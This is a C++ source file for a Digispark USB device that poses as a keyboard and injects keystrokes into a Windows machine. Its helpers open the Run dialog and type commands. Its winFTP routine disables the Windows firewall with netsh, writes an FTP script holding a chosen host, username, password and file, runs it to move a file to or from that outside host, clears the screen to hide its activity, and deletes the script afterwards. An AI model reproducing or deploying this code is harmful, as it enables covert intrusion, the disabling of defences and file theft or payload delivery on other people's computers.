#include "DigiKeyboard.h"
#include "NinjaKeyboard.h"

void EthicNinjaKeyboard::init(int x)
{
	DigiKeyboard.sendKeyStroke(0);
	DigiKeyboard.delay(x);
}

void EthicNinjaKeyboard::echo(char* x)
{  
	DigiKeyboard.print(x); 
}

void EthicNinjaKeyboard::echoEnter(char* x)
{  
	DigiKeyboard.print(x);
	DigiKeyboard.sendKeyStroke(KEY_ENTER);
}

void EthicNinjaKeyboard::sleep(int x)
{
	DigiKeyboard.delay(x);
}

void EthicNinjaKeyboard::winRUN(char* x)
{  
	DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
	DigiKeyboard.delay(500);
	DigiKeyboard.println(x);
	DigiKeyboard.delay(500);
}

void EthicNinjaKeyboard::winFTP(char* action,char* username,char* password,char* host, char* port,char* file)
{  
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);  
  DigiKeyboard.println("cmd");
  DigiKeyboard.delay(600);
  DigiKeyboard.println("cd %USERPROFILE%");  
  DigiKeyboard.println("@echo off");
  DigiKeyboard.println("del ftp.txt");
  DigiKeyboard.println("netsh firewall set opmode disable");
  DigiKeyboard.delay(2000);
  DigiKeyboard.print("echo open ");
  DigiKeyboard.print(host);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(port);
  DigiKeyboard.println(" > ftp.txt");
  
  DigiKeyboard.println("cls");
  
  DigiKeyboard.print("echo ");
  DigiKeyboard.print(username);
  DigiKeyboard.println(">> ftp.txt");
  
  DigiKeyboard.println("cls");
  
  DigiKeyboard.print("echo ");
  DigiKeyboard.print(password);
  DigiKeyboard.println(">> ftp.txt");
  	
  DigiKeyboard.println("cls");

  DigiKeyboard.println("echo bin >> ftp.txt");
  
  DigiKeyboard.print("echo ");
  DigiKeyboard.print(action);
  DigiKeyboard.print(" ");
  DigiKeyboard.print(file);
  DigiKeyboard.println(" >> ftp.txt");

  DigiKeyboard.println("cls");
  
  DigiKeyboard.println("echo bye >> ftp.txt");
  DigiKeyboard.println("cls");
  DigiKeyboard.println("ftp -s:ftp.txt");
  DigiKeyboard.println("del ftp.txt & exit");
}